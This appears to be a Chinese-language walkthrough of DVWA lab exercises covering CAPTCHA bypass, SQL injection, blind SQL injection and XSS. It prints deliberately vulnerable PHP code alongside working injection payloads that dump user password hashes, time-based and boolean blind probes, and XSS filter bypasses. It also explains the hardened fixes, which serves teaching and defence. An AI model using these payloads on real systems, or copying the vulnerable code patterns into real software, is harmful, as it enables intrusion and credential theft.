+    mysql_close(); 
+} 
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-17"><a href="#-17" class="headerlink" title=" "></a> </h2><p>服务器的验证逻辑是当$resp是false，并且参数recaptcha_response_field不等于hidd3n_valu3或者http包头的User-Agent参数不等于reCAPTCHA时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。<br>抓包<br><img src="https://image.3001.net/images/20161110/14787634573020.png!small"><br>更改参数recaptcha_response_field以及http包头的User-Agent：<br><img src="https://image.3001.net/images/20161110/1478763487811![]()!small"><br>密码修改成功：<br><img src="https://image.3001.net/images/20161110/14787635158708.png!small"></p>
+<h2 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-14"><a href="#源代码-14" class="headerlink" title="源代码"></a>源代码</h2><p>if( isset( $_POST[ ‘Change’ ] ) ) {<br>    // Check Anti-CSRF token<br>    checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ ); </p>
+<pre><code>// Hide the CAPTCHA form 
+$hide_form = true; 
+
+// Get input 
+$pass_new  = $_POST[ &#39;password_new&#39; ]; 
+$pass_new  = stripslashes( $pass_new ); 
+$pass_new  = mysql_real_escape_string( $pass_new ); 
+$pass_new  = md5( $pass_new ); 
+
+$pass_conf = $_POST[ &#39;password_conf&#39; ]; 
+$pass_conf = stripslashes( $pass_conf ); 
+$pass_conf = mysql_real_escape_string( $pass_conf ); 
+$pass_conf = md5( $pass_conf ); 
+
+$pass_curr = $_POST[ &#39;password_current&#39; ]; 
+$pass_curr = stripslashes( $pass_curr ); 
+$pass_curr = mysql_real_escape_string( $pass_curr ); 
+$pass_curr = md5( $pass_curr ); 
+
+// Check CAPTCHA from 3rd party 
+$resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], 
+    $_SERVER[ &#39;REMOTE_ADDR&#39; ], 
+    $_POST[ &#39;recaptcha_challenge_field&#39; ], 
+    $_POST[ &#39;recaptcha_response_field&#39; ] ); 
+
+// Did the CAPTCHA fail? 
+if( !$resp-&gt;is_valid ) &#123; 
+    // What happens when the CAPTCHA was entered incorrectly 
+    echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; 
+    $hide_form = false; 
+    return; 
+&#125; 
+else &#123; 
+    // Check that the current password is correct 
+    $data = $db-&gt;prepare( &#39;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); 
+    $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
+    $data-&gt;bindParam( &#39;:password&#39;, $pass_curr, PDO::PARAM_STR ); 
+    $data-&gt;execute(); 
+
+    // Do both new password match and was the current password correct? 
+    if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; 
+        // Update the database 
+        $data = $db-&gt;prepare( &#39;UPDATE users SET password = (:password) WHERE user = (:user);&#39; ); 
+        $data-&gt;bindParam( &#39;:password&#39;, $pass_new, PDO::PARAM_STR ); 
+        $data-&gt;bindParam( &#39;:user&#39;, dvwaCurrentUser(), PDO::PARAM_STR ); 
+        $data-&gt;execute(); 
+
+        // Feedback for the end user - success! 
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
+    &#125; 
+    else &#123; 
+        // Feedback for the end user - failed! 
+        echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; 
+        $hide_form = false; 
+    &#125; 
+&#125; </code></pre>
+<p>} </p>
+<p>// Generate Anti-CSRF token<br>generateSessionToken(); </p>
+<h2 id="gt"><a href="#gt" class="headerlink" title="?&gt; "></a>?&gt; </h2><p>Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p>
+<h1 id="第七题-SQL-Injection"><a href="#第七题-SQL-Injection" class="headerlink" title="第七题-SQL-Injection"></a>第七题-SQL-Injection</h1><h2 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h2><h2 id="源代码-15"><a href="#源代码-15" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) { 
+    // Get input 
+    $id = $_REQUEST[ 'id' ]; 
+
+    // Check database 
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+    // Get results 
+    $num = mysql_numrows( $result ); 
+    $i   = 0; 
+    while( $i < $num ) { 
+        // Get values 
+        $first = mysql_result( $result, $i, "first_name" ); 
+        $last  = mysql_result( $result, $i, "last_name" ); 
+
+        // Feedback for end user 
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+
+        // Increase loop count 
+        $i++; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-18"><a href="#-18" class="headerlink" title=" "></a> </h2><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
+<p>输入1，查询成功：</p>
+<p>输入1’and ‘1’ =’2，查询失败，返回结果为空：</p>
+<p>输入1’or ‘1234 ’=’1234，查询成功：</p>
+<p>返回了多个结果，说明存在字符型注入。</p>
+<p>输入1’ or 1=1 order by 1 #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797983721114.png!small"><br>输入1’ or 1=1 order by 2 #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797984067767.png!small"><br>输入1’ or 1=1 order by 3 #，查询失败：<br><img src="https://image.3001.net/images/20161122/14797984355690.png!small"><br>输入1’ union select 1,database() #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985121733.png!small"><br>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985443503.png!small"><br>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：<br><img src="https://image.3001.net/images/20161122/14797985937424.png!small"><br>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br><img src="https://image.3001.net/images/20161122/1479801212675![]()!small"><br>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p>
+<h2 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h2><hr>
+<?php 
+
+if( isset( $_POST[ 'Submit' ] ) ) { 
+    // Get input 
+    $id = $_POST[ 'id' ]; 
+    $id = mysql_real_escape_string( $id ); 
+
+    // Check database 
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+
+    // Get results 
+    $num = mysql_numrows( $result ); 
+    $i   = 0; 
+    while( $i < $num ) { 
+        // Display values 
+        $first = mysql_result( $result, $i, "first_name" ); 
+        $last  = mysql_result( $result, $i, "last_name" ); 
+
+        // Feedback for end user 
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+
+        // Increase loop count 
+        $i++; 
+    } 
+
+    //mysql_close(); 
+} 
+
+?><h2 id="-19"><a href="#-19" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>抓包更改参数id为1 or 1=1 #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/1479798808442.png!small"></p>
+<p>说明存在数字型注入。</p>
+<p>（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）</p>
+<p>2.猜解SQL查询语句中的字段数<br>抓包更改参数id为1 order by 2 #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14797988504283.png!small"></p>
+<p>抓包更改参数id为1 order by 3 #，报错：</p>
+<p><img src="https://image.3001.net/images/20161122/14797988815192.png!small"></p>
+<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<p>3.确定显示的字段顺序</p>
+<p>抓包更改参数id为1 union select 1,2 #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14797989187637.png!small"></p>
+<p>说明执行的SQL语句为select First name,Surname from 表 where ID=id…</p>
+<p>4.获取当前数据库<br>抓包更改参数id为1 union select 1,database() #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14797989528253.png!small"><br>说明当前的数据库为dvwa。</p>
+<p>5.获取数据库中的表<br>抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14797989786852.png!small"></p>
+<p>说明数据库dvwa中一共有两个表，guestbook与users。</p>
+<p>6.获取表中的字段名<br>抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users ’#，查询失败：</p>
+<p><img src="https://image.3001.net/images/20161122/14797990065259.png!small"></p>
+<p>这是因为单引号被转义了，变成了\’。</p>
+<p>可以利用16进制进行绕过，抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14797990363415.png!small"></p>
+<p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
+<p>7.下载数据<br>抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14798013767789.png!small"></p>
+<p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据</p>
+<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><h2 id="源代码-16"><a href="#源代码-16" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_SESSION [ 'id' ] ) ) { 
+    // Get input 
+    $id = $_SESSION[ 'id' ]; 
+
+    // Check database 
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;"; 
+    $result = mysql_query( $query ) or die( '<pre>Something went wrong.</pre>' ); 
+
+    // Get results 
+    $num = mysql_numrows( $result ); 
+    $i   = 0; 
+    while( $i < $num ) { 
+        // Get values 
+        $first = mysql_result( $result, $i, "first_name" ); 
+        $last  = mysql_result( $result, $i, "last_name" ); 
+
+        // Feedback for end user 
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+
+        // Increase loop count 
+        $i++; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-20"><a href="#-20" class="headerlink" title=" "></a> </h2><p>可以看到，与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。</p>
+<p>输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：</p>
+<p><img src="https://image.3001.net/images/20161122/14798014536165.png!small"></p>
+<p>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
+<p><img src="https://image.3001.net/images/20161122/14797991619669.png!small"></p>
+<h2 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-17"><a href="#源代码-17" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_GET[ 'Submit' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+    // Get input 
+    $id = $_GET[ 'id' ]; 
+
+    // Was a number entered? 
+    if(is_numeric( $id )) { 
+        // Check the database 
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
+        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
+        $data->execute(); 
+        $row = $data->fetch(); 
+
+        // Make sure only 1 result is returned 
+        if( $data->rowCount() == 1 ) { 
+            // Get values 
+            $first = $row[ 'first_name' ]; 
+            $last  = $row[ 'last_name' ]; 
+
+            // Feedback for end user 
+            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>"; 
+        } 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-21"><a href="#-21" class="headerlink" title=" "></a> </h2><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p>
+<h1 id="第八题-SQL-Injection-Blind"><a href="#第八题-SQL-Injection-Blind" class="headerlink" title="第八题-SQL-Injection-(Blind)"></a>第八题-SQL-Injection-(Blind)</h1><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-18"><a href="#源代码-18" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_GET[ 'Submit' ] ) ) { 
+    // Get input 
+    $id = $_GET[ 'id' ]; 
+
+    // Check database 
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; 
+    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 
+
+    // Get results 
+    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
+    if( $num > 0 ) { 
+        // Feedback for end user 
+        echo '<pre>User ID exists in the database.</pre>'; 
+    } 
+    else { 
+        // User wasn't found, so the page wasn't! 
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 
+
+        // Feedback for end user 
+        echo '<pre>User ID is MISSING from the database.</pre>'; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><p><br>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，</p>
+<p>User ID exists in the database.与User ID is MISSING from the database.，因此这里是SQL盲注漏洞。</p>
+<h2 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h2><p>输入1’ and sleep(5) #，感觉到明显延迟；</p>
+<h2 id="输入1-and-sleep-5-，没有延迟；"><a href="#输入1-and-sleep-5-，没有延迟；" class="headerlink" title="输入1 and sleep(5) #，没有延迟；"></a>输入1 and sleep(5) #，没有延迟；</h2><p>说明存在字符型的基于时间的盲注。</p>
+<p>2.猜解当前数据库名<br>首先猜解数据名的长度：</p>
+<hr>
+<p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p>
+<p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p>
+<h2 id="1’-and-if-length-database-4-sleep-5-1-明显延迟"><a href="#1’-and-if-length-database-4-sleep-5-1-明显延迟" class="headerlink" title="1’ and if(length(database())=4,sleep(5),1) # 明显延迟"></a>1’ and if(length(database())=4,sleep(5),1) # 明显延迟</h2><p>说明数据库名长度为4个字符。</p>
+<h2 id="接着采用二分法猜解数据库名："><a href="#接着采用二分法猜解数据库名：" class="headerlink" title="接着采用二分法猜解数据库名："></a>接着采用二分法猜解数据库名：</h2><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
+<p>…</p>
+<p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p>
+<p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p>
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<h2 id="…"><a href="#…" class="headerlink" title="…"></a>…</h2><p>重复上述步骤，即可猜解出数据库名。</p>
+<p>3.猜解数据库中的表名<br>首先猜解数据库中表的数量：</p>
+<hr>
+<p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p>
+<h2 id="1’-and-if-select-count-table-name-from-information-schema-tables-where-table-schema-database-2-sleep-5-1-明显延迟"><a href="#1’-and-if-select-count-table-name-from-information-schema-tables-where-table-schema-database-2-sleep-5-1-明显延迟" class="headerlink" title="1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟"></a>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟</h2><p>说明数据库中有两个表。</p>
+<h2 id="接着挨个猜解表名："><a href="#接着挨个猜解表名：" class="headerlink" title="接着挨个猜解表名："></a>接着挨个猜解表名：</h2><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟</p>
+<p>说明第一个表名的长度为9个字符。</p>
+<h2 id="采用二分法即可猜解出表名。"><a href="#采用二分法即可猜解出表名。" class="headerlink" title="采用二分法即可猜解出表名。"></a>采用二分法即可猜解出表名。</h2><p>4.猜解表中的字段名<br>首先猜解表中字段的数量：</p>
+<hr>
+<p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p>
+<p>…</p>
+<h2 id="1’-and-if-select-count-column-name-from-information-schema-columns-where-table-name-’users’-8-sleep-5-1-明显延迟"><a href="#1’-and-if-select-count-column-name-from-information-schema-columns-where-table-name-’users’-8-sleep-5-1-明显延迟" class="headerlink" title="1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟"></a>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟</h2><p>说明users表中有8个字段。</p>
+<h2 id="接着挨个猜解字段名："><a href="#接着挨个猜解字段名：" class="headerlink" title="接着挨个猜解字段名："></a>接着挨个猜解字段名：</h2><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p>
+<p>…</p>
+<h2 id="1’-and-if-length-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-0-1-1-7-sleep-5-1-明显延迟"><a href="#1’-and-if-length-substr-select-column-name-from-information-schema-columns-where-table-name-’users’-limit-0-1-1-7-sleep-5-1-明显延迟" class="headerlink" title="1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟"></a>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟</h2><p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<p>5.猜解数据<br>同样采用二分法。</p>
+<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-19"><a href="#源代码-19" class="headerlink" title="源代码 "></a>源代码 </h2><?php 
+
+if( isset( $_POST[ 'Submit' ]  ) ) { 
+    // Get input 
+    $id = $_POST[ 'id' ]; 
+    $id = mysql_real_escape_string( $id ); 
+
+    // Check database 
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; 
+    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 
+
+    // Get results 
+    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
+    if( $num > 0 ) { 
+        // Feedback for end user 
+        echo '<pre>User ID exists in the database.</pre>'; 
+    } 
+    else { 
+        // Feedback for end user 
+        echo '<pre>User ID is MISSING from the database.</pre>'; 
+    } 
+
+    //mysql_close(); 
+} 
+
+?><h2 id="-22"><a href="#-22" class="headerlink" title=" "></a> </h2><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,,‘,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p>使用基于时间的盲注：</p>
+<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；</p>
+<p>抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
+<p>抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0x7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。</p>
+<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><h2 id="源代码-20"><a href="#源代码-20" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_COOKIE[ 'id' ] ) ) { 
+    // Get input 
+    $id = $_COOKIE[ 'id' ]; 
+
+    // Check database 
+    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; 
+    $result = mysql_query( $getid ); // Removed 'or die' to suppress mysql errors 
+
+    // Get results 
+    $num = @mysql_numrows( $result ); // The '@' character suppresses errors 
+    if( $num > 0 ) { 
+        // Feedback for end user 
+        echo '<pre>User ID exists in the database.</pre>'; 
+    } 
+    else { 
+        // Might sleep a random amount 
+        if( rand( 0, 5 ) == 3 ) { 
+            sleep( rand( 2, 4 ) ); 
+        } 
+
+        // User wasn't found, so the page wasn't! 
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 
+
+        // Feedback for end user 
+        echo '<pre>User ID is MISSING from the database.</pre>'; 
+    } 
+
+    mysql_close(); 
+} 
+
+?><h2 id="-23"><a href="#-23" class="headerlink" title=" "></a> </h2><p>High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<h2 id="虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："><a href="#虽然添加了LIMIT-1，但是我们可以通过-将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：" class="headerlink" title="虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注："></a>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们可以使用基于布尔的盲注：</h2><p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p>
+<p>抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+<h2 id="抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。"><a href="#抓包将cookie中参数id改为1’-and-select-count-column-name-from-information-schema-columns-where-table-name-0x7573657273-8-，（0x7573657273-为users的16进制），显示存在，说明uers表有8个字段。" class="headerlink" title="抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。"></a>抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #，（0x7573657273 为users的16进制），显示存在，说明uers表有8个字段。</h2><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-21"><a href="#源代码-21" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+if( isset( $_GET[ 'Submit' ] ) ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+
+    // Get input 
+    $id = $_GET[ 'id' ]; 
+
+    // Was a number entered? 
+    if(is_numeric( $id )) { 
+        // Check the database 
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); 
+        $data->bindParam( ':id', $id, PDO::PARAM_INT ); 
+        $data->execute(); 
+
+        // Get results 
+        if( $data->rowCount() == 1 ) { 
+            // Feedback for end user 
+            echo '<pre>User ID exists in the database.</pre>'; 
+        } 
+        else { 
+            // User wasn't found, so the page wasn't! 
+            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' ); 
+
+            // Feedback for end user 
+            echo '<pre>User ID is MISSING from the database.</pre>'; 
+        } 
+    } 
+} 
+
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+
+?><h2 id="-24"><a href="#-24" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p>
+<h1 id="第九题-XSS-Reflected"><a href="#第九题-XSS-Reflected" class="headerlink" title="第九题-XSS-(Reflected)"></a>第九题-XSS-(Reflected)</h1><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-22"><a href="#源代码-22" class="headerlink" title="源代码"></a>源代码</h2><?php 
+
+// Is there any input? 
+
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+
+    // Feedback for end user 
+
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
+
+} 
+
+?>
+<hr>
+<p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。<br><img src="https://image.3001.net/images/20161223/14824823248355.png!small"></p>
+<h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-23"><a href="#源代码-23" class="headerlink" title="源代码"></a>源代码</h2><?php 
+// Is there any input? 
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+    // Get input 
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] ); 
+    // Feedback for end user 
+    echo "<pre>Hello ${name}</pre>"; 
+} 
+?>
+<hr>
+<p>这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script><br>删除，这种防护机制是可以被轻松绕过的。</p>
+<p>输入&lt;sc<script>ript>alert(/xss/)</script>，成功弹框：<br><img src="https://image.3001.net/images/20161223/14824824105236.png!small"></p>
+<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><h2 id="源代码-24"><a href="#源代码-24" class="headerlink" title="源代码"></a>源代码</h2><?php 
+// Is there any input? 
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+    // Get input 
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 
+    // Feedback for end user 
+    echo "<pre>Hello ${name}</pre>"; 
+} 
+?>
+<hr>
+<p>High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。<br>虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
+<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><img src=1 onerror=alert(/xss/)>
+---
+成功弹框：
+
+<p><img src="https://image.3001.net/images/20161223/14824825209982.png!small"></p>
+<h2 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h2><h2 id="源代码-25"><a href="#源代码-25" class="headerlink" title="源代码"></a>源代码</h2><?php 
+// Is there any input? 
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
+    // Check Anti-CSRF token 
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
+    // Get input 
+    $name = htmlspecialchars( $_GET[ 'name' ] ); 
+    // Feedback for end user 
+    echo "<pre>Hello ${name}</pre>"; 
+} 
+// Generate Anti-CSRF token 
+generateSessionToken(); 
+?>
+<hr>
+<p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素。</p>
+<h1 id="第十题-XSS-Stored"><a href="#第十题-XSS-Stored" class="headerlink" title="第十题-XSS-(Stored)"></a>第十题-XSS-(Stored)</h1><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><h2 id="源代码-26"><a href="#源代码-26" class="headerlink" title="源代码"></a>源代码</h2><?php 
+if( isset( $_POST[ 'btnSign' ] ) ) { 
+    // Get input 
+    $message = trim( $_POST[ 'mtxMessage' ] ); 
+    $name    = trim( $_POST[ 'txtName' ] ); 
+    // Sanitize message input 
+    $message = stripslashes( $message ); 
+    $message = mysql_real_escape_string( $message ); 
+    // Sanitize name input 
+    $name = mysql_real_escape_string( $name ); 
+    // Update database 
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"; 
+    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' ); 
+    //mysql_close(); 
+} 
+?><h2 id="、"><a href="#、" class="headerlink" title="、"></a>、</h2><p>相关函数介绍</p>
+<p>trim(string,charlist)</p>
